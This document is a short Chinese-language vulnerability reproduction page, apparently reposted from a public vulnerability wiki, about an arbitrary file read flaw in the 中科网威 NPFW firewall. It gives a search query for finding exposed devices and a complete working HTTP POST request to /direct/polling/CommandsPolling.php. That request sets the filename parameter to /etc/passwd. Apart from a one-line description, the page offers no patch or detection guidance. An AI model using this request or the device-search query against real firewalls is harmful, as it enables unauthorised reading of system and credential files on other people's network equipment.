---
title: "中科网威 NPFW防火墙 CommandsPolling.php 任意文件读取漏洞"
date: 2026-10-18 09:15:42
categories:
  - WebSecurity
  - CVE
  - "IoT"
  - "中科网威"
tags:
  - "中科网威"
  - "任意文件读取"
  - "漏洞复现"
---
## 漏洞描述

中科网威 NPFW防火墙 存在任意文件读取漏洞，由于代码过滤不足，可读取服务器任意文件

## 漏洞影响

```
中科网威 NPFW防火墙 
```

## 网络测绘

```
"中科网威" && "/direct"
```

## 漏洞复现

登录页面

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202101852340.png)

发送请求包

```php
POST /direct/polling/CommandsPolling.php HTTP/1.1
Host: 
Cookie: PHPSESSID=014d2705856e1df139772db42ccbaf9f
Content-Length: 47
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="92", " Not A;Brand";v="99", "Google Chrome";v="92"
Sec-Ch-Ua-Mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Connection: close

command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
```

![img](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/202202101852498.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/iot/%E4%B8%AD%E7%A7%91%E7%BD%91%E5%A8%81-NPFW%E9%98%B2%E7%81%AB%E5%A2%99-CommandsPolling.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md)
